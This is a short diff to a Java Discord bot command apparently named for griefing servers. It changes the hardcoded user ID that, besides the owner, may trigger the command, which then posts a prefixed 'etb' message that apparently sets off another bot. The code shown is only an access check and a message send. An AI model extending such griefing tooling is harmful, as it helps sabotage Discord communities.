@@ -12,7 +12,7 @@ public class GriefServerCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
 
-        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("698607465885073489")) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("725452437342912542")) {
             return;
         }
         event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(1, TimeUnit.SECONDS);
